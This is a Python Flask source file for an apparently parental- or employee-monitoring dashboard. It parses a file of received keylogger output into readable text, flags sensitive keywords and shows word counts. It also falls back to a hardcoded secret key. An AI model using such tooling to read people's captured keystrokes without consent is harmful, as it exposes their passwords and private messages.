from flask import Flask, render_template, jsonify, session, request, redirect
from functools import wraps
import re
from collections import Counter
import os
import logging

app = Flask(__name__)
app.secret_key = os.environ.get('SECRET_KEY', 'guardian-lens-paragraph-secret')

# Path to keylog file (relative to this script's directory)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
LOG_PATH = os.path.join(BASE_DIR, '..', 'received_logs.txt')

# Sensitive keywords
def load_keywords():
    keywords_path = os.path.join(BASE_DIR, "keywords.txt")
    try:
        with open(keywords_path, "r", encoding="utf-8") as f:
            return [line.strip().lower() for line in f if line.strip()]
    except FileNotFoundError:
        logging.warning(f"keywords.txt not found at {keywords_path}. Using empty keyword list.")
        return []
    except Exception as e:
        logging.error(f"Error loading keywords: {e}")
        return []

KEYWORDS = load_keywords()

# Simple auth decorator
def require_auth(f):
    @wraps(f)
    def decorated(*args, **kwargs):
        if not session.get('authenticated'):
            return jsonify({"error": "Unauthorized"}), 401
        return f(*args, **kwargs)
    return decorated

# Convert keylog into readable text
def parse_keylog(file_path):
    readable_text = ""

    if not os.path.exists(file_path):
        return "Log file not found."

    try:
        with open(file_path, "r", encoding="utf-8") as file:
            lines = file.readlines()
    except Exception as e:
        logging.error(f"Error reading log file: {e}")
        return "Unable to read log file."

    for line in lines:
        if " - " not in line:
            continue

        parts = line.split(" - ", 1)
        if len(parts) < 2:
            continue
        key_part = parts[1].strip()

        if len(key_part) == 1:
            readable_text += key_part

        elif "<" in key_part and ">" in key_part:
            ascii_code = re.findall(r"<(\d+)>", key_part)
            if ascii_code:
                try:
                    code = int(ascii_code[0])
                    if 0 <= code <= 0x10FFFF:
                        readable_text += chr(code)
                except (ValueError, OverflowError):
                    pass

        elif "Key.backspace" in key_part:
            readable_text = readable_text[:-1]

        elif "Key.enter" in key_part:
            readable_text += "\n"

        elif "Key.space" in key_part:
            readable_text += " "

        else:
            continue

    return readable_text


# Detect sensitive keywords
def detect_keywords(text):
    found_words = []
    words = text.split()

    for word in words:
        for keyword in KEYWORDS:
            if keyword.lower() in word.lower():
                found_words.append(word)

    return list(set(found_words))


# Word frequency
def word_frequency(text):
    words = re.findall(r'\b\w+\b', text.lower())
    return Counter(words).most_common(10)


# Main dashboard page
@app.route("/")
@require_auth
def dashboard():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)

    return render_template(
        "dashboard.html",
        text=parsed_text,
        detected=detected_words,
        frequency=frequency
    )


# Live data API
@app.route("/live-data")
@require_auth
def live_data():
    parsed_text = parse_keylog(LOG_PATH)
    detected_words = detect_keywords(parsed_text)
    frequency = word_frequency(parsed_text)

    return jsonify({
        "text": parsed_text,
        "detected": detected_words,
        "frequency": frequency
    })


if __name__ == "__main__":
    app.run(debug=False, port=3000)
